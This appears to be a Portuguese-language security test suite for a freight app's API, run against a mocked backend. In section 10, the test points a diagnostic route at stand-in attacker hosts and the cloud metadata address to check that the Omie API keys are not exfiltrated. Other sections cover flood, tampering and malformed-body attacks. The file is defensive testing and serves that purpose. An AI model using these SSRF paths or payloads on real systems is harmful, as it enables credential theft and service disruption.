/**
 * BATERIA DE ATAQUE — segunda rodada.
 *
 * A primeira rodada foi atrás de "consigo fazer o que não é meu?". Esta vai
 * atrás de três outras famílias:
 *
 *   - **roubar segredo**: fazer o servidor mandar as chaves da Omie pra fora;
 *   - **entupir**: mandar tanta coisa de uma vez que o app pare, ou que o banco
 *     encha de lixo que ninguém vai limpar;
 *   - **mentir nos números**: gravar valores que a tela nunca deixaria digitar e
 *     que estragam o relatório depois (o tipo de erro que ninguém percebe na
 *     hora, só no fim do mês).
 *
 * Rodar:  node testes/ataque2.test.mjs
 */
import Module from 'node:module';
import { criarSupabaseFalso, instalar, chamar } from './apoio/supabase-falso.mjs';

const { cliente, banco, zerar } = criarSupabaseFalso();
instalar(Module, cliente);

const exigir = Module.createRequire(import.meta.url);
const omieRaw = exigir('../api/omie-raw.js');
const romaneios = exigir('../api/romaneios.js');
const paradaSeparar = exigir('../api/parada-separar.js');
const romaneioCarregado = exigir('../api/romaneio-carregado.js');
const paradaStatus = exigir('../api/parada-status.js');
const fotoUpload = exigir('../api/foto-upload.js');
const equipeLogin = exigir('../api/equipe-login.js');

let ok = 0, falhas = 0;
const achados = [];
const checa = (nome, cond, extra) => {
  if (cond) { ok++; console.log(`  OK      ${nome}${extra ? ' — ' + extra : ''}`); }
  else { falhas++; achados.push(nome); console.log(`  ENTROU  ${nome}${extra ? ' — ' + extra : ''}`); }
};
const titulo = t => {
  console.log('\n============================================================');
  console.log('  ' + t);
  console.log('============================================================');
};

const TOKEN_JOAO = 'sessao-joao';
const TOKEN_MARIA = 'sessao-maria';
const TOKEN_DONO = 'jwt-dono';

function cenario() {
  zerar();
  banco.usuarios[TOKEN_DONO] = { id: 'u-dono', email: 'dono@exemplo.com' };
  banco.tabelas.perfis = [{ id: 'u-dono', papel: 'dono' }];
  banco.tabelas.freteiros = [
    { id: 'f-joao', nome: 'João', telefone: '83999990001' },
    { id: 'f-pedro', nome: 'Pedro', telefone: '83999990003' }
  ];
  banco.tabelas.estoquistas = [{ id: 'e-maria', nome: 'Maria', telefone: '83999990002' }];
  const daquiA30 = new Date(Date.now() + 30 * 864e5).toISOString();
  banco.tabelas.sessoes_equipe = [
    { token: TOKEN_JOAO, tipo: 'freteiro', pessoa_id: 'f-joao', nome: 'João', expira_em: daquiA30 },
    { token: TOKEN_MARIA, tipo: 'estoquista', pessoa_id: 'e-maria', nome: 'Maria', expira_em: daquiA30 }
  ];
  banco.tabelas.romaneios = [
    { id: 'r-joao', codigo: 'R0001', freteiro_id: 'f-joao', status: 'aberto', carregamento_confirmado: false, valor_frete: 150 }
  ];
  banco.tabelas.paradas = [{
    id: 'pjoao', romaneio_id: 'r-joao', ordem: 0, status: 'pendente', numero: '1001',
    cliente: { nome: 'Dona Ana' }, valor: 3200, volumes: 3, volumes_confirmados: 0,
    itens: [{ descricao: 'Guarda-roupa', volumes: 2 }, { descricao: 'Cômoda', volumes: 1 }],
    separado: false
  }];
  process.env.OMIE_APP_KEY = 'chave-secreta-da-omie';
  process.env.OMIE_APP_SECRET = 'segredo-da-omie';
  delete process.env.ADMIN_EMAILS;
}

const comoDono = (corpo, extra = {}) => ({
  headers: { authorization: 'Bearer ' + TOKEN_DONO }, body: JSON.stringify(corpo), ...extra
});
const comoJoao = (corpo, extra = {}) => ({
  headers: { authorization: 'Bearer ' + TOKEN_JOAO }, body: JSON.stringify(corpo), ...extra
});
const comoMaria = (corpo, extra = {}) => ({
  headers: { authorization: 'Bearer ' + TOKEN_MARIA }, body: JSON.stringify(corpo), ...extra
});

/* ------------------------------------------------------------------ *
 * Espiona o fetch: se alguma chamada sair pra fora, a gente vê pra    *
 * onde foi e o que levava no corpo.                                   *
 * ------------------------------------------------------------------ */
const fetchOriginal = globalThis.fetch;
let saidas = [];
globalThis.fetch = async (url, opcoes = {}) => {
  saidas.push({ url: String(url && url.url ? url.url : url), corpo: String(opcoes.body || '') });
  return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
};

/* ================================================================== */
titulo('10. FAZER O SERVIDOR ENTREGAR AS CHAVES DA OMIE');

// omie-raw existe pra diagnóstico: manda um método qualquer pra Omie e mostra a
// resposta crua. O "path" vem do corpo, e o cliente monta a URL com
// new URL(path, BASE) — que, com um endereço ABSOLUTO, ignora o BASE inteiro.
// Como o app_key e o app_secret vão no corpo de toda chamada, apontar o path pra
// fora é o mesmo que mandar suas credenciais de presente.
//
// É rota de gerente, então não é qualquer um — mas basta o gerente abrir um link
// preparado com a sessão dele aberta. Segredo não se protege só por senha.
cenario();
for (const alvo of [
  'https://coletor-do-atacante.exemplo/roubo',
  '//coletor-do-atacante.exemplo/roubo',
  'http://169.254.169.254/latest/meta-data/',
  'https://app.omie.com.br.atacante.exemplo/x'
]) {
  saidas = [];
  const r = await chamar(omieRaw, comoDono({ path: alvo, call: 'ListarPedidos' }));
  const vazou = saidas.some(s =>
    !s.url.startsWith('https://app.omie.com.br/') && s.corpo.includes('segredo-da-omie'));
  checa(`path "${alvo.slice(0, 42)}" não leva o segredo pra fora`,
    r.status === 400 && !vazou,
    vazou ? 'VAZOU PRA ' + saidas[0].url : r.corpo.erro);
}
{
  saidas = [];
  const r = await chamar(omieRaw, comoDono({ path: 'geral/pedidos/', call: 'ListarPedidos' }));
  checa('o caminho normal da Omie continua funcionando',
    r.status === 200 && saidas[0] && saidas[0].url.startsWith('https://app.omie.com.br/api/v1/geral/pedidos/'),
    saidas[0] ? saidas[0].url : 'não chamou nada');
}

/* ================================================================== */
titulo('11. ENTUPIR O BANCO');

cenario();
{
  // 5 mil paradas numa chamada só. Cada uma vira linha no banco, e o romaneio
  // fica impossível de abrir depois — inclusive pra você, no painel.
  const muitas = Array.from({ length: 5000 }, (_, i) => ({ numero: String(i), itens: [{ volumes: 1 }] }));
  const r = await chamar(romaneios, comoJoao({ paradas: muitas }));
  const criadas = (banco.tabelas.paradas || []).length;
  checa('5.000 paradas de uma vez é recusado', r.status === 400 && criadas <= 1,
    criadas > 1 ? 'criou ' + criadas + ' paradas' : r.corpo.erro);
}
cenario();
{
  // Um item só, com um texto de 2 MB dentro. A coluna é jsonb: aceita.
  const enorme = { descricao: 'A'.repeat(2 * 1024 * 1024), volumes: 1 };
  const r = await chamar(romaneios, comoJoao({ paradas: [{ numero: '1', itens: [enorme] }] }));
  const gravado = JSON.stringify((banco.tabelas.paradas || []).map(p => p.itens) || '');
  checa('item com 2 MB de texto é recusado', r.status === 400 || gravado.length < 100000,
    gravado.length >= 100000 ? 'gravou ' + Math.round(gravado.length / 1024) + ' KB' : r.corpo.erro);
}
cenario();
{
  const muitosItens = Array.from({ length: 3000 }, () => ({ descricao: 'x', volumes: 1 }));
  const r = await chamar(romaneios, comoJoao({ paradas: [{ numero: 'com-3000', itens: muitosItens }] }));
  // A parada nova, não a que o cenário já tinha criado.
  const p = (banco.tabelas.paradas || []).find(x => x.numero === 'com-3000');
  checa('3.000 itens numa parada é cortado', r.status === 400 || !p || p.itens.length <= 100,
    p ? 'gravou ' + p.itens.length + ' itens' : r.corpo.erro);
}

/* ================================================================== */
titulo('12. MENTIR NOS NÚMEROS');

cenario();
{
  // valor_frete é quanto VOCÊ paga pro freteiro. Ele não pode escolher.
  const r = await chamar(romaneios, comoJoao({
    paradas: [{ numero: '1', itens: [{ volumes: 1 }] }], valorFrete: 99999
  }));
  const novo = (banco.tabelas.romaneios || []).find(x => x.id !== 'r-joao');
  checa('freteiro não define o próprio frete', !novo || Number(novo.valor_frete) === 0,
    novo ? 'gravou frete ' + novo.valor_frete : 'não criou');
}
cenario();
{
  // Nem trocar o frete de uma rota que já existe.
  await chamar(romaneios, comoJoao({
    valorFrete: 99999, paradas: [{ numero: '2', itens: [{ volumes: 1 }] }]
  }, { queryStringParameters: { id: 'r-joao' } }));
  const rom = banco.tabelas.romaneios.find(x => x.id === 'r-joao');
  checa('freteiro não reajusta o frete da rota dele', Number(rom.valor_frete) === 150,
    'frete virou ' + rom.valor_frete);
}
cenario();
{
  // Nem passar a rota pra outro freteiro.
  await chamar(romaneios, comoJoao({
    freteiroId: 'f-pedro', paradas: [{ numero: '2', itens: [{ volumes: 1 }] }]
  }, { queryStringParameters: { id: 'r-joao' } }));
  const rom = banco.tabelas.romaneios.find(x => x.id === 'r-joao');
  checa('freteiro não repassa a rota pra outro', rom.freteiro_id === 'f-joao',
    'a rota foi parar com ' + rom.freteiro_id);
}
cenario();
{
  // Criar rota "pra outro" — o freteiro_id é sempre travado em quem chamou.
  await chamar(romaneios, comoJoao({
    freteiroId: 'f-pedro', paradas: [{ numero: '1', itens: [{ volumes: 1 }] }]
  }));
  const novo = (banco.tabelas.romaneios || []).find(x => x.id !== 'r-joao');
  checa('freteiro não cria rota no nome do colega', !novo || novo.freteiro_id === 'f-joao',
    novo ? 'criou no nome de ' + novo.freteiro_id : '');
}
cenario();
{
  const r = await chamar(romaneios, comoJoao({
    paradas: [{ numero: '1', valor: -5000, peso: -10, itens: [{ volumes: -3 }] }]
  }));
  const p = (banco.tabelas.paradas || []).find(x => x.numero === '1' && x.id !== 'pjoao');
  checa('valor e volume negativos não entram',
    !p || (p.valor >= 0 && p.volumes >= 0),
    p ? `valor ${p.valor}, volumes ${p.volumes}` : '');
}

/* ================================================================== */
titulo('13. CONFIRMAR VOLUME QUE NÃO EXISTE');

cenario();
{
  for (let i = 0; i < 10; i++) await chamar(paradaSeparar, comoMaria({ paradaId: 'pjoao' }));
  const p = banco.tabelas.paradas[0];
  checa('não dá pra confirmar mais volume do que a parada tem',
    p.volumes_confirmados <= p.volumes,
    `confirmou ${p.volumes_confirmados} de ${p.volumes}`);
}
cenario();
{
  for (let i = 0; i < 5; i++) await chamar(paradaSeparar, comoMaria({ paradaId: 'pjoao', desfazer: true }));
  const p = banco.tabelas.paradas[0];
  checa('desfazer não deixa o contador negativo', p.volumes_confirmados >= 0,
    'ficou em ' + p.volumes_confirmados);
}
cenario();
{
  const r = await chamar(romaneioCarregado, comoMaria({ romaneioId: 'r-que-nao-existe' }));
  checa('confirmar carregamento de rota inexistente dá erro claro',
    r.status === 404, 'status ' + r.status + ': ' + (r.corpo.erro || ''));
}

/* ================================================================== */
titulo('14. CORPO ESQUISITO NO LUGAR DO JSON ESPERADO');

cenario();
for (const corpo of ['[]', '"texto"', '123', 'null', '{"paradaId":{"$ne":null}}', '{"paradaId":["a","b"]}']) {
  const r = await chamar(paradaStatus, { headers: { authorization: 'Bearer ' + TOKEN_JOAO }, body: corpo });
  checa(`corpo ${corpo.slice(0, 24)} não derruba a função`,
    r.status >= 400 && r.status < 500, 'status ' + r.status);
}
{
  const r = await chamar(paradaStatus, { headers: { authorization: 'Bearer ' + TOKEN_JOAO }, body: '{quebrado' });
  checa('JSON quebrado dá 400, não 500', r.status === 400);
}
{
  const r = await chamar(fotoUpload, comoMaria({ paradaId: 'pjoao', imagemBase64: '!!!nada disso é base64!!!' }));
  checa('base64 inválido não derruba o upload', r.status === 400, r.corpo.erro);
}
{
  const r = await chamar(equipeLogin, { headers: {}, body: JSON.stringify({ telefone: '83999990001', tipo: { a: 1 } }) });
  checa('tipo de login que não é texto não derruba', r.status < 500, 'status ' + r.status);
}

/* ================================================================== */
globalThis.fetch = fetchOriginal;

console.log('\n============================================================');
console.log(`${ok} ataques barrados · ${falhas} passaram`);
if (falhas) {
  console.log('\nPASSARAM (conserte):');
  achados.forEach(a => console.log('  · ' + a));
  process.exit(1);
}
console.log('\nNenhum ataque passou.');
